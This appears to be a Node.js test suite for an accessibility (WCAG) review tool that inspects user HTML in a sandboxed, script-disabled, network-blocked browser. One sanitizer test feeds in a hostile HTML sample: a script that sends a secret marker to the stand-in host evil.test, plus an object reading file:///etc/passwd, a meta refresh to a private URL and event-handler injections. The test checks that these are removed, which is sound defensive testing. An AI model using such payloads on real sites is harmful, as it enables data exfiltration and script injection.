import assert from "node:assert/strict";
import test from "node:test";
import {
  MAX_WCAG_HTML_BYTES,
  MAX_WCAG_CONTROLS,
  MAX_WCAG_TAB_STEPS,
  MAX_WCAG_FINDINGS,
  emptyWcagReview,
  validateWcagInput,
  analyzeWcagEvidence,
  reviewWcagInteractions,
} from "../dist/modules/browser-ux/wcag-interactions.js";

const named = (index, extra = {}) => ({
  index, visible: true, enabled: true, focusable: true, name_present: true,
  positive_tabindex: false, aria_hidden: false, custom_role_without_tab_stop: false,
  ...extra,
});
const focused = (index, extra = {}) => ({
  index, outline_or_shadow_present: true,
  inside_viewport: true, opacity_zero: false, summary: false,
  ...extra,
});
const reviewed = (controls, focus = [], options = {}) =>
  analyzeWcagEvidence({
    controls_seen: controls.length, controls, page_scripts_present: 0,
  }, focus, { viewportWidth: 960, viewportHeight: 720, ...options });
const find = (r, code) => r.findings.filter((item) => item.code === code);

test("P1-12: successful inert browser review never implies WCAG conformance", () => {
  const r = reviewed([named(1)], [focused(1)], { tabSteps: 1 });
  assert.equal(r.scope, "offline_sandboxed_rendered_html");
  assert.equal(r.browser_executed, true);
  assert.equal(r.scripts_disabled, true);
  assert.equal(r.controls_seen, 1);
  assert.equal(r.controls_inspected, 1);
  assert.equal(r.unique_tab_targets, 1);
  assert.equal(r.total_findings, 0);
  assert.equal(r.coverage_limited, true);
  assert(r.limitations.join(" ").includes("not an exhaustive"));
  assert(r.limitations.join(" ").includes("No links are activated"));
});

test("P1-12: visible unlabeled controls produce a review warning, not content leakage", () => {
  const r = reviewed([named(1, { name_present: false }), named(2)]);
  assert.equal(r.visible_controls_without_name, 1);
  assert.equal(find(r, "missing_accessible_name").length, 1);
  assert.equal(find(r, "missing_accessible_name")[0].evidence, "rendered_dom");
  assert.equal(find(r, "missing_accessible_name")[0].control, 1);
  assert(!JSON.stringify(r).includes("<button>"));
});

test("P1-12: hidden and disabled controls are not falsely described as unlabeled interactive controls", () => {
  const r = reviewed([
    named(1, { name_present: false, visible: false }),
    named(2, { name_present: false, enabled: false }),
  ]);
  assert.equal(r.visible_controls_without_name, 0);
  assert.equal(r.total_findings, 0);
});

test("P1-12: positive tabindex, aria-hidden focus and custom role without a Tab stop are distinguished", () => {
  const r = reviewed([
    named(1, { positive_tabindex: true, aria_hidden: true }),
    named(2, { focusable: false, custom_role_without_tab_stop: true }),
  ]);
  assert.equal(r.positive_tabindex_controls, 1);
  assert.equal(r.aria_hidden_focusable_controls, 1);
  assert.equal(r.custom_roles_without_tab_stop, 1);
  assert.equal(find(r, "positive_tabindex")[0].severity, "warning");
  assert.equal(find(r, "aria_hidden_focusable")[0].severity, "warning");
  assert.equal(find(r, "custom_role_not_keyboard_focusable")[0].severity, "warning");
});

test("P1-12: computed focus outline and shadow evidence is advisory, not an accessibility certificate", () => {
  const r = reviewed([named(1), named(2), named(3)], [
    focused(1), focused(2, { outline_or_shadow_present: false }),
    focused(3, { opacity_zero: true }),
  ]);
  assert.equal(r.focus_indicator_review_leads, 2);
  assert.equal(find(r, "potential_focus_indicator_absent").length, 2);
  assert(find(r, "potential_focus_indicator_absent").every((f) => f.severity === "info"));
});

test("P1-12: real Tab target outside viewport is flagged conservatively", () => {
  const r = reviewed([named(1)], [focused(1, { inside_viewport: false })]);
  assert.equal(r.focus_outside_viewport, 1);
  assert.equal(find(r, "focus_outside_viewport").length, 1);
  assert.equal(find(r, "focus_outside_viewport")[0].evidence, "keyboard_tab");
});

test("P1-12: repeated Tab observations do not double-count focus targets", () => {
  const r = reviewed([named(1), named(2)], [focused(1), focused(1), focused(2)]);
  assert.equal(r.unique_tab_targets, 2);
  assert.equal(r.total_findings, 0);
});

test("P1-12: native summary enter test is truthful about observed toggle", () => {
  const okay = reviewed([named(1)], [focused(1, { summary: true })], {
    nativeSummariesTested: 1, nativeSummariesToggled: 1,
  });
  assert.equal(okay.native_summaries_tested, 1);
  assert.equal(okay.native_summaries_toggled, 1);
  assert.equal(okay.total_findings, 0);
  const failed = reviewed([named(1)], [focused(1, { summary: true })], {
    nativeSummariesTested: 1, nativeSummariesToggled: 0,
  });
  assert.equal(failed.native_summaries_toggled, 0);
  assert.equal(find(failed, "summary_enter_not_toggled").length, 1);
  assert.equal(find(failed, "summary_enter_not_toggled")[0].evidence, "native_summary");
});

test("P1-12: 120-control coverage cap, 12 findings cap and warning priority apply", () => {
  const controls = Array.from({ length: MAX_WCAG_CONTROLS }, (_, i) =>
    named(i + 1, { name_present: false, positive_tabindex: true }));
  const r = analyzeWcagEvidence({
    controls_seen: 131, controls, page_scripts_present: 1,
  }, [], { viewportWidth: 375, viewportHeight: 600 });
  assert.equal(r.controls_seen, 131);
  assert.equal(r.controls_inspected, MAX_WCAG_CONTROLS);
  assert.equal(r.controls_truncated, true);
  assert.equal(r.scripts_present, 1);
  assert.equal(r.visible_controls_without_name, MAX_WCAG_CONTROLS);
  assert.equal(r.total_findings, 2 * MAX_WCAG_CONTROLS);
  assert.equal(r.findings.length, MAX_WCAG_FINDINGS);
  assert.equal(r.findings_truncated, true);
  assert(r.findings.every((f) => f.severity === "warning"));
  assert(Buffer.byteLength(JSON.stringify(r), "utf8") < 10_000);
});

test("P1-12: keyboard budget validation protects against excess runtime", () => {
  assert.equal(validateWcagInput("<button>Ok</button>").maxTabSteps, MAX_WCAG_TAB_STEPS);
  assert.deepEqual(validateWcagInput("é", {
    maxTabSteps: 1, viewportWidth: 375, viewportHeight: 812,
  }), { width: 375, height: 812, maxTabSteps: 1 });
  for (const maxTabSteps of [0, -1, 25, 1.5, Infinity]) {
    assert.throws(() => validateWcagInput("<button>Ok</button>", { maxTabSteps }));
  }
  for (const viewportWidth of [0, 319, 1441, 1.4, Infinity]) {
    assert.throws(() => validateWcagInput("<button>Ok</button>", { viewportWidth }));
  }
  for (const viewportHeight of [0, 359, 1081]) {
    assert.throws(() => validateWcagInput("<button>Ok</button>", { viewportHeight }));
  }
});

test("P1-12: oversized Unicode and blank HTML fail before Chromium starts", async () => {
  let launched = 0;
  const runtime = { async launch() { launched++; throw new Error("should not launch"); } };
  await assert.rejects(reviewWcagInteractions("é".repeat(MAX_WCAG_HTML_BYTES / 2 + 1),
    {}, runtime), /byte limit/);
  await assert.rejects(reviewWcagInteractions(" ", {}, runtime), /nonempty/);
  await assert.rejects(reviewWcagInteractions("", {}, runtime), /nonempty/);
  assert.equal(launched, 0);
});

test("P1-12: malformed injected fake observations cannot claim browser coverage", () => {
  for (const snapshot of [
    { controls_seen: -1, controls: [], page_scripts_present: 0 },
    { controls_seen: 1, controls: [named(1), named(1)], page_scripts_present: 0 },
    { controls_seen: 0, controls: [named(1)], page_scripts_present: 0 },
    { controls_seen: MAX_WCAG_CONTROLS + 1,
      controls: Array.from({ length: MAX_WCAG_CONTROLS + 1 }, (_, i) => named(i + 1)),
      page_scripts_present: 0 },
  ]) {
    assert.throws(() => analyzeWcagEvidence(snapshot, [], {
      viewportWidth: 960, viewportHeight: 720,
    }));
  }
  assert.throws(() => analyzeWcagEvidence({
    controls_seen: 1, controls: [named(1)], page_scripts_present: 0,
  }, Array.from({ length: MAX_WCAG_TAB_STEPS + 1 }, () => focused(1)), {
    viewportWidth: 960, viewportHeight: 720,
  }));
});

test("P1-12: representative script-disabled, deny-network browser workflow uses only Tab and native Summary Enter", async () => {
  const calls = [];
  const requests = [];
  const controls = [
    named(1, { name_present: false }),
    named(2, { positive_tabindex: true }),
    named(3),
  ];
  const focus = [
    focused(1, { outline_or_shadow_present: false }),
    focused(2),
    focused(3, { summary: true }),
    focused(1),
  ];
  let tabCursor = 0, summaryOpen = false, evaluationCount = 0, closed = 0, noArgCount = 0;
  const page = {
    setDefaultTimeout(ms) { calls.push("timeout:" + ms); },
    setDefaultNavigationTimeout(ms) { calls.push("navigation:" + ms); },
    async setViewport(v) { calls.push("viewport:" + v.width); },
    async setJavaScriptEnabled(value) { calls.push("js:" + value); },
    async setRequestInterception(value) { calls.push("intercept:" + value); },
    on(kind, listener) {
      if (kind === "request") {
        calls.push("request-listener");
        const request = { async abort(code) { requests.push(code); } };
        listener(request);
      }
    },
    async setContent(html) {
      assert(html.includes("<button>FAKE_SECRET</button>"));
      calls.push("set-content");
      assert(calls.indexOf("js:false") < calls.indexOf("set-content"));
      assert(calls.indexOf("intercept:true") < calls.indexOf("set-content"));
    },
    async evaluate(_fn, ...args) {
      if (args.length === 2) {
        if (args[1] === 3) {
          calls.push("focus-summary");
          return true;
        }
        if (evaluationCount++ === 0) {
          return { controls_seen: controls.length, controls, page_scripts_present: 1 };
        }
        return focus[Math.min(tabCursor - 1, focus.length - 1)];
      }
      // Initial blur, before-Enter and after-Enter observations.
      noArgCount++;
      return summaryOpen;
    },
    keyboard: {
      async press(key) {
        calls.push("press:" + key);
        if (key === "Tab") tabCursor++;
        if (key === "Enter") summaryOpen = true;
      },
    },
  };
  const runtime = {
    async launch(proxyServer) {
      calls.push("launch:" + proxyServer);
      return {
        async newPage() { return page; },
        async close() { closed++; },
      };
    },
  };
  const r = await reviewWcagInteractions(
    "<html><button>FAKE_SECRET</button></html>", { maxTabSteps: 4 }, runtime);
  assert.equal(r.browser_executed, true);
  assert.equal(r.resources_blocked, 1);
  assert.equal(r.visible_controls_without_name, 1);
  assert.equal(r.positive_tabindex_controls, 1);
  assert.equal(r.unique_tab_targets, 3);
  assert.equal(r.native_summaries_tested, 1);
  assert.equal(r.native_summaries_toggled, 1);
  assert.deepEqual(requests, ["blockedbyclient"]);
  assert(calls.includes("launch:http://127.0.0.1:9"));
  assert(!calls.some((x) => x.includes("click") || x.includes("goto")));
  assert(!JSON.stringify(r).includes("FAKE_SECRET"));
  assert.equal(closed, 1);
});

test("P1-12: failed browser launch is surfaced without creating a false result", async () => {
  const secret = "FAKE_USER_HTML_SECRET";
  const runtime = { async launch() { throw new Error("runtime unavailable"); } };
  await assert.rejects(reviewWcagInteractions("<button>" + secret + "</button>", {}, runtime),
    /runtime unavailable/);
  const empty = emptyWcagReview();
  assert.equal(empty.browser_executed, false);
  assert.equal(empty.coverage_limited, true);
  assert.equal(empty.total_findings, 0);
  assert(!JSON.stringify(empty).includes(secret));
});

test("P1-12: sanitizer removes active HTML before creating the isolated document", async () => {
  const secret = "FAKE_MARKER_WCAG_SECRET";
  let stripped = "", closed = 0, tabs = 0, evaluations = 0;
  const runtime = {
    async launch(proxy) {
      assert.equal(proxy, "http://127.0.0.1:9");
      return {
        async newPage() {
          return {
            setDefaultTimeout() {},
            setDefaultNavigationTimeout() {},
            async setViewport() {},
            async setJavaScriptEnabled(value) { assert.equal(value, false); },
            async setRequestInterception(value) { assert.equal(value, true); },
            on() {},
            async setContent(html) { stripped = html; },
            async evaluate(_fn, ...args) {
              if (args.length === 2) return evaluations++ === 0
                ? { controls_seen: 0, controls: [], page_scripts_present: 0 } : null;
              return null;
            },
            keyboard: { async press(key) { assert.equal(key, "Tab"); tabs++; } },
          };
        },
        async close() { closed++; },
      };
    },
  };
  const r = await reviewWcagInteractions(
    '<html><head><meta http-equiv="REFRESH" content="0;URL=http://127.0.0.1/private">'
    + '<script>fetch("https://evil.test/' + secret + '")</script></head>'
    + '<body onload="alert(1)"><button onclick="alert(1)">Hi</button>'
    + '<iframe srcdoc="<script>alert(1)</script>"></iframe>'
    + '<object data="file:///etc/passwd"></object><embed src="https://evil.test/asset">'
    + '</body></html>', { maxTabSteps: 1 }, runtime);
  assert.doesNotMatch(stripped, /<script|<iframe|<object|<embed|onload=|onclick=|http-equiv="refresh"/i);
  assert.equal(r.browser_executed, true);
  assert.ok(r.scripts_present >= 1);
  assert(!JSON.stringify(r).includes(secret));
  assert.equal(tabs, 1);
  assert.equal(closed, 1);
});

test("P1-12: browser closes even if document parsing fails", async () => {
  let closed = 0;
  const runtime = {
    async launch() {
      return {
        async newPage() {
          return {
            setDefaultTimeout() {},
            setDefaultNavigationTimeout() {},
            async setViewport() {},
            async setJavaScriptEnabled() {},
            async setRequestInterception() {},
            on() {},
            async setContent() { throw new Error("dom parse failed"); },
          };
        },
        async close() { closed++; },
      };
    },
  };
  await assert.rejects(reviewWcagInteractions("<button>Test</button>", {}, runtime),
    /dom parse failed/);
  assert.equal(closed, 1);
});
